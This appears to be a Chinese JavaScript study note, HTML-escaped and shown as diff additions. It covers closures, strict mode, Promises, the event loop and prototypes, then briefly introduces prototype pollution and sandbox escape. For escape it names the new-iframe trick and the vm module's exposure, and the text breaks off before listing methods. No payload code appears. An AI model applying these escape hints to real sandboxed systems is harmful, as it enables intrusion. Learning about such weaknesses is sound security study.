data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function-variable function&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; privateCounter&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* logs 0 */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;increment&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;increment&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* logs 2 */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;decrement&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* logs 1 */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;全局对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#全局对象&#34;&gt;#&lt;/a&gt; 全局对象&lt;/h2&gt;
+&lt;p&gt;全局对象是一个特殊的对象，它的作用域是全局的。&lt;/p&gt;
+&lt;p&gt;全平台可用的全局对象是  &lt;code&gt;globalThis&lt;/code&gt;  ，它跟全局作用域里的 this 值相同。另外在浏览器中存在  &lt;code&gt;self&lt;/code&gt;  和  &lt;code&gt;window&lt;/code&gt;  全局对象，Web Workers 中存在  &lt;code&gt;self&lt;/code&gt;  全局对象，Node.js 中存在  &lt;code&gt;global&lt;/code&gt;  全局对象。&lt;/p&gt;
+&lt;h1 id=&#34;严格模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#严格模式&#34;&gt;#&lt;/a&gt; 严格模式&lt;/h1&gt;
+&lt;h2 id=&#34;简介-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-3&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
+&lt;p&gt;在 ES5 中，除了正常的运行模式之外，添加了严格模式（strict mode），这种模式使得代码显式地脱离 “马虎模式 / 稀松模式 / 懒散模式 “（sloppy）模式在更严格的条件下运行。严格模式不仅仅是一个子集：它的产生是为了形成与正常代码不同的语义。&lt;/p&gt;
+&lt;p&gt;引入严格模式的目的主要是：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;通过抛出错误来消除了一些原有静默错误&lt;/li&gt;
+&lt;li&gt;消除 JavaScript 语法的一些不合理、不严谨之处，减少一些怪异行为&lt;/li&gt;
+&lt;li&gt;消除代码运行的一些不安全之处，保证代码运行的安全&lt;/li&gt;
+&lt;li&gt;修复了一些导致 JavaScript 引擎难以执行优化的缺陷，提高编译器效率，增加运行速度&lt;/li&gt;
+&lt;li&gt;禁用了在 ECMAScript 的未来版本中可能会定义的一些语法，为未来新版本的 JavaScript 做铺垫&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#调用&#34;&gt;#&lt;/a&gt; 调用&lt;/h2&gt;
+&lt;p&gt;严格模式使用  &lt;code&gt;&amp;quot;use strict&amp;quot;;&lt;/code&gt;  字符串开启。对整个脚本文件而言，可以将  &lt;code&gt;&amp;quot;use strict&amp;quot;&lt;/code&gt;  放在脚本文件的第一行使整个脚本以严格模式运行。如果这行语句不在第一行则不会生效，会以正常模式运行。&lt;/p&gt;
+&lt;p&gt;对单个函数而言，将  &lt;code&gt;&amp;quot;use strict&amp;quot;&lt;/code&gt;  放在函数体的第一行，则整个函数以严格模式运行。&lt;/p&gt;
+&lt;h2 id=&#34;行为改变&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#行为改变&#34;&gt;#&lt;/a&gt; 行为改变&lt;/h2&gt;
+&lt;p&gt;在严格模式中，主要有以下的行为更改：&lt;/p&gt;
+&lt;h3 id=&#34;全局变量显式声明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#全局变量显式声明&#34;&gt;#&lt;/a&gt; 全局变量显式声明&lt;/h3&gt;
+&lt;p&gt;在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;&amp;quot;use strict&amp;quot;;
+for(i = 0; i &amp;lt; 2; i++) &amp;#123; // ReferenceError: i is not defined
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;禁止使用with语句&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#禁止使用with语句&#34;&gt;#&lt;/a&gt; 禁止使用 with 语句&lt;/h3&gt;
+&lt;p&gt;with 语句无法在编译时就确定，属性到底归属哪个对象，这会影响编译效率，所以在严格模式中被禁止。&lt;/p&gt;
+&lt;h3 id=&#34;创设eval作用域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创设eval作用域&#34;&gt;#&lt;/a&gt; 创设 eval 作用域&lt;/h3&gt;
+&lt;p&gt;正常模式下，eval 语句的作用域，取决于它处于全局作用域，还是处于函数作用域。严格模式下，eval 语句本身就是一个作用域，不再能够生成全局变量了，它所生成的变量只能用于 eval 内部。&lt;/p&gt;
+&lt;h3 id=&#34;禁止删除变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#禁止删除变量&#34;&gt;#&lt;/a&gt; 禁止删除变量&lt;/h3&gt;
+&lt;p&gt;严格模式下无法删除变量。只有 configurable 设置为 true 的对象属性，才能被删除。&lt;/p&gt;
+&lt;h3 id=&#34;显式报错&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#显式报错&#34;&gt;#&lt;/a&gt; 显式报错&lt;/h3&gt;
+&lt;p&gt;正常模式下一些错误只会默默地失败，但是严格模式下将会报错，包括以下几种场景：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;对一个对象的只读属性进行赋值&lt;/li&gt;
+&lt;li&gt;对一个使用 getter 方法读取的属性进行赋值&lt;/li&gt;
+&lt;li&gt;对禁止扩展的对象添加新属性&lt;/li&gt;
+&lt;li&gt;删除一个不可删除的属性&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;语法错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#语法错误&#34;&gt;#&lt;/a&gt; 语法错误&lt;/h3&gt;
+&lt;p&gt;严格模式新增了一些语法错误，包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;对象不能有重名的属性&lt;/li&gt;
+&lt;li&gt;函数不能有重名的参数&lt;/li&gt;
+&lt;li&gt;禁止八进制表示法&lt;/li&gt;
+&lt;li&gt;函数必须声明在顶层&lt;/li&gt;
+&lt;li&gt;新增保留字
+&lt;ul&gt;
+&lt;li&gt;class&lt;/li&gt;
+&lt;li&gt;enum&lt;/li&gt;
+&lt;li&gt;export&lt;/li&gt;
+&lt;li&gt;extends&lt;/li&gt;
+&lt;li&gt;import&lt;/li&gt;
+&lt;li&gt;super&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;安全增强&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全增强&#34;&gt;#&lt;/a&gt; 安全增强&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;禁止 this 关键字指向全局对象&lt;/li&gt;
+&lt;li&gt;禁止在函数内部遍历调用栈&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;限制arguments对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#限制arguments对象&#34;&gt;#&lt;/a&gt; 限制 arguments 对象&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;不允许对 arguments 赋值&lt;/li&gt;
+&lt;li&gt;arguments 不再追踪参数的变化&lt;/li&gt;
+&lt;li&gt;禁止使用 arguments.callee&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;异步机制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#异步机制&#34;&gt;#&lt;/a&gt; 异步机制&lt;/h1&gt;
+&lt;h2 id=&#34;async-await&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#async-await&#34;&gt;#&lt;/a&gt; async / await&lt;/h2&gt;
+&lt;p&gt;async function 关键字用来在表达式中定义异步函数。&lt;/p&gt;
+&lt;h2 id=&#34;promise&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#promise&#34;&gt;#&lt;/a&gt; Promise&lt;/h2&gt;
+&lt;p&gt;Promise 对象是一个代理对象（代理一个值），被代理的值在 Promise 对象创建时可能是未知的。它允许你为异步操作的成功和失败分别绑定相应的处理方法（handlers）。 这让异步方法可以像同步方法那样返回值，但并不是立即返回最终执行结果，而是一个能代表未来出现的结果的 promise 对象&lt;/p&gt;
+&lt;p&gt;一个 Promise 有以下几种状态:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;pending: 初始状态，既不是成功，也不是失败状态。&lt;/li&gt;
+&lt;li&gt;fulfilled: 意味着操作成功完成。&lt;/li&gt;
+&lt;li&gt;rejected: 意味着操作失败。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;pending 状态的 Promise 对象可能会变为 fulfilled 状态并传递一个值给相应的状态处理方法，也可能变为失败状态（rejected）并传递失败信息。当其中任一种情况出现时，Promise 对象的 then 方法绑定的处理方法（handlers ）就会被调用（then 方法包含两个参数：onfulfilled 和 onrejected，它们都是 Function 类型。当 Promise 状态为 fulfilled 时，调用 then 的 onfulfilled 方法，当 Promise 状态为 rejected 时，调用 then 的 onrejected 方法， 所以在异步操作的完成和绑定处理方法之间不存在竞争）。&lt;/p&gt;
+&lt;p&gt;因为 Promise.prototype.then 和 Promise.prototype.catch 方法返回 promise 对象， 所以它们可以被链式调用。&lt;/p&gt;
+&lt;h2 id=&#34;执行队列&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行队列&#34;&gt;#&lt;/a&gt; 执行队列&lt;/h2&gt;
+&lt;p&gt;JavaScript 中的异步运行机制如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;所有同步任务都在主线程上执行，形成一个执行栈&lt;/li&gt;
+&lt;li&gt;主线程之外，还存在一个任务队列。只要异步任务有了运行结果，就在任务队列之中放置一个事件。&lt;/li&gt;
+&lt;li&gt;一旦执行栈中的所有同步任务执行完毕，系统就会读取任务队列，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。&lt;/li&gt;
+&lt;li&gt;主线程不断重复上面的第三步。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;其中浏览器的内核是多线程的，在浏览器的内核中不同的异步操作由不同的浏览器内核模块调度执行，异步操作会将相关回调添加到任务队列中。可以分为 DOM 事件、时间回调、网络回调三种：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DOM 事件：由浏览器内核的 DOM 模块来处理，当事件触发的时候，回调函数会被添加到任务队列中。&lt;/li&gt;
+&lt;li&gt;时间回调：setTimeout /setInterval 等函数会由浏览器内核的 timer 模块来进行延时处理，当时间到达的时候，将回调函数添加到任务队列中。&lt;/li&gt;
+&lt;li&gt;网络回调：ajax /fetch 等则由浏览器内核的 network 模块来处理，在网络请求完成返回之后，才将回调添加到任务队列中。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;原型链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原型链&#34;&gt;#&lt;/a&gt; 原型链&lt;/h1&gt;
+&lt;h2 id=&#34;显式原型和隐式原型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#显式原型和隐式原型&#34;&gt;#&lt;/a&gt; 显式原型和隐式原型&lt;/h2&gt;
+&lt;p&gt;JavaScript 的原型分为显式原型（explicit prototype property）和隐式原型（implicit prototype link）。&lt;/p&gt;
+&lt;p&gt;其中显式原型指 prototype，是函数的一个属性，这个属性是一个指针，指向一个对象，显示修改对象的原型的属性，只有函数才有该属性&lt;/p&gt;
+&lt;p&gt;隐式原型指 JavaScript 中任意对象都有的内置属性 prototype。在 ES5 之前没有标准的方法访问这个内置属性，但是大多数浏览器都支持通过  &lt;code&gt;__proto__&lt;/code&gt;  来访问。ES5 中有了对于这个内置属性标准的 Get 方法  &lt;code&gt;Object.getPrototypeOf()&lt;/code&gt;  。&lt;/p&gt;
+&lt;p&gt;隐式原型指向创建这个对象的函数 (constructor) 的 prototype，  &lt;code&gt;__proto__&lt;/code&gt;  指向的是当前对象的原型对象，而 prototype 指向的，是以当前函数作为构造函数构造出来的对象的原型对象。&lt;/p&gt;
+&lt;p&gt;显式原型的作用用来实现基于原型的继承与属性的共享。 隐式原型的用于构成原型链，同样用于实现基于原型的继承。举个例子，当我们访问 obj 这个对象中的 x 属性时，如果在 obj 中找不到，那么就会沿着  &lt;code&gt;__proto__&lt;/code&gt;  依次查找。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Note: Object.prototype 这个对象是个例外，它的__proto__值为null
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;new-的过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#new-的过程&#34;&gt;#&lt;/a&gt; new 的过程&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;var Person = function()&amp;#123;&amp;#125;;
+var p = new Person();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;new 的过程拆分成以下三步： -  &lt;code&gt;var p=&amp;#123;&amp;#125;;&lt;/code&gt;  初始化一个对象 p -  &lt;code&gt;p.__proto__ = Person.prototype;&lt;/code&gt;  -  &lt;code&gt;Person.call(p);&lt;/code&gt;  构造 p，也可以称之为初始化 p&lt;/p&gt;
+&lt;p&gt;关键在于第二步，我们来证明一下：&lt;/p&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;token function-variable function&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__proto__ &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这段代码会返回 true。说明我们步骤 2 是正确的。&lt;/p&gt;
+&lt;h2 id=&#34;示例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#示例&#34;&gt;#&lt;/a&gt; 示例&lt;/h2&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;token function-variable function&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function-variable function&#34;&gt;sayName&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;My Name is Jacky&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;27&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sayName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;p 是一个引用指向 Person 的对象。我们在 Person 的原型上定义了一个 sayName 方法和 age 属性，当我们执行 p.age 时，会先在 this 的内部查找（也就是构造函数内部），如果没有找到然后再沿着原型链向上追溯。&lt;/p&gt;
+&lt;p&gt;这里的向上追溯是怎么向上的呢？这里就要使用  &lt;code&gt;__proto__&lt;/code&gt;  属性来链接到原型（也就是 Person.prototype）进行查找。最终在原型上找到了 age 属性。&lt;/p&gt;
+&lt;h2 id=&#34;原型链污染&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原型链污染&#34;&gt;#&lt;/a&gt; 原型链污染&lt;/h2&gt;
+&lt;p&gt;如前文提到的，JavaScript 是动态继承，通过  &lt;code&gt;__proto__&lt;/code&gt;  修改自身对象时会影响到有相同原型的对象。因此当键值对是用户可控的情况下，就可能出现原型链污染。&lt;/p&gt;
+&lt;h1 id=&#34;沙箱逃逸&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#沙箱逃逸&#34;&gt;#&lt;/a&gt; 沙箱逃逸&lt;/h1&gt;
+&lt;h2 id=&#34;前端沙箱&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前端沙箱&#34;&gt;#&lt;/a&gt; 前端沙箱&lt;/h2&gt;
+&lt;p&gt;在前端中，可能会使用删除  &lt;code&gt;eval&lt;/code&gt;  ，重写  &lt;code&gt;Function.prototype.constructor&lt;/code&gt;  /  &lt;code&gt;GeneratorFunction&lt;/code&gt;  /  &lt;code&gt;AsyncFunction&lt;/code&gt;  等方式来完成前端的沙箱。在这种情况下，可以使用创建一个新 iframe 的方式来获取新的执行环境。&lt;/p&gt;
+&lt;h2 id=&#34;服务端沙箱&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#服务端沙箱&#34;&gt;#&lt;/a&gt; 服务端沙箱&lt;/h2&gt;
+&lt;p&gt;JavaScript 提供了原生的 vm 模块，用于隔离了代码上下文环境。但是在该环境中依然可以访问标准的 JavaScript API 和全局的 NodeJS 环境。&lt;/p&gt;
+&lt;p&gt;在原生的沙箱模块中，常用的逃逸方式为：&lt;/p&gt;
